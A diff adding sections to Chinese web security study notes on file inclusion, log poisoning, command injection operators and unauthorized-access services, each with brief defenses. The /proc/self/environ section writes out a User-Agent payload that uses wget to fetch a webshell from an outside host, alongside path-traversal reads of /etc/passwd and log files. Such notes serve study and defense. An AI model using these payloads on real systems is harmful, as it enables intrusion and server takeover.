@@ -14,6 +14,8 @@
 3)使用W3C提出的CSP (Content Security Policy, 内容安全策略)，定义域名白名单
 4)设置cookie的httponly属性
 
+绕过：通过表单
+
 
 
 ### csrf
@@ -167,6 +169,100 @@ www.baidu. compxxphp?image= (地址) 的就可能存在SSRF漏洞。
 绕过:使用不同协议，针对IP IP格式的绕过， 针对URL, 恶意URL增天，
 宇符，@之类的。301跳转-drs rbindaingo
 
+### 文件包含
+
+- 包含上传文件
+
+用户上传了一个可执行文件，通过文件包含那个文件实现漏洞利用
+防御：
+    做好上传限制
+    隐藏好文件路径
+    设置访问权限、执行权限
+
+- 伪协议
+
+  php*：//input：用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。*
+
+  data://：将原本的include的文件流重定向到了用户可控制的输入流中
+
+- 包含日志文件
+
+  ```
+  1、日志的默认路径
+      /etc/httpd/logs/access_log或/var/log/httpd/access_log        //apache+linux
+      D:xamppapachelogsaccess.log或D:xamppapachelogserror.log  //apache_win2003
+      C:WINDOWSsystem32Logfiles                     //iis6.0+win2003
+      %SystemDrive%inetpublogsLogFiles            //iis7.0+win2003
+      nginx 日志文件在用户安装目录的logs目录下
+  2、web中间件默认配置uoh文件
+      /etc/httpd/conf/httpd.conf或index.php?page=/etc/init.d/httpd        //apache+linux
+      C:/Windows/system32/inetsrv/metabase.xml          //iis6.0+win2003
+      C:WindowsSystem32inetsrvconfigapplicationHost.config           //iis7.0+win
+  3、利用
+      访问http://www.xx.com/<?php phpinfo(); ?>时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent；但是在日志里这句话被编码了；所以用Burp Suite修改来绕过编码；然后包含相应的日志文件：
+      http://localhost/include/file.php?file=../../apache/logs/access.log //（这里利用相对路径，找到日志文件，并以php解析的方式打开)
+  4、防御
+      隐藏或修改默认日志文件
+      设置日志文件读取权限
+  ```
+
+  
+
+- 包含/proc/self/environ
+
+  ```
+  1、找文件包含漏洞
+      www.aaa.com/view.php?page=../
+      www.aaa.com/view.php?page=../../../../../etc/passwd
+  2、检查proc/self/environ是否可以访问
+      www.aaa.com/view.php?page=../../../../../proc/self/environ
+  3、如果可读就注入代码
+      访问：www.aaa.com/view.php?page=../../../../../proc/self/environ
+      选择User-Agent 写代码如下：<?system('wget http://www.yourweb.com/oneword.txt -O shell.php');?>    //提交请求；我们的命令将被执行(将下载http://www.yourweb.com/oneword.txt，并将其保存为它在shell.php网站目录)，我们的shell也就被创建,.如果不行，尝试使用exec()，因为系统可能被禁用的从php.ini网络服务器.
+  4、访问shell
+  5、防御：
+      设置proc/self/environ不可访问
+  
+  ```
+
+- 包含Session文件
+
+  ?file=../../../../../../tmp/sess_1sv3pu01f97dp3qcfef8i2b9r2         //读取session文件
+
+
+
+### 命令执行漏洞
+
+分为远程代码执行和系统命令执行两类。
+
+如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命
+令拼接到正常命令中，从而造成命令执行攻击。
+
+- 命令注入攻击中, Web服务器没有过滤类似system、eval和exec等函数，是该漏洞攻击成功的主要原因。
+- 继承Web服务程序的权限去执行系统命令（任意代码）或读写文件
+- 反弹shell
+- 控制整个网站甚至控制服务器
+- 进一步内网渗透
+- 管道符号
+  - ;前面的执行完执行后面的
+  - |是管道符，显示后面的执行结果
+  - ||当前面的执行出错时执行后面的
+  - &前面的语句为假则直接执行后面的
+  - &&前面的语句为假则直接出错，后面的也不执行
+  - |直接执行后面的语句
+  - ||前面出错执行后面的
+
+常见场景：
+
+- Ping主机
+- DNS请求
+- Office文档
+- 框架缺陷
+
+
+
+
+
 ### 文件上传
 
 23、文件上传漏洞原理
@@ -272,3 +368,20 @@ PHP注入会使攻击者执行任意代码getshel从而控制网站或服务器�
 • etc/passwd
 • Php.ini
 • Web.xml
+
+
+
+### 未授权访问
+
+- [MongoDB](https://so.csdn.net/so/search?q=MongoDB&spm=1001.2101.3001.7020) 未授权访问漏洞
+- Redis 未授权访问漏洞
+- Memcached 未授权
+- JBOSS 未授权
+- [VNC](https://so.csdn.net/so/search?q=VNC&spm=1001.2101.3001.7020) 未授权
+- ZooKeeper 未授权
+- Rsync 未授权
+- Hadoop未授权
+- Jenkins未授权
+- Elasticsearch未授权
+- CouchDB未授权
+
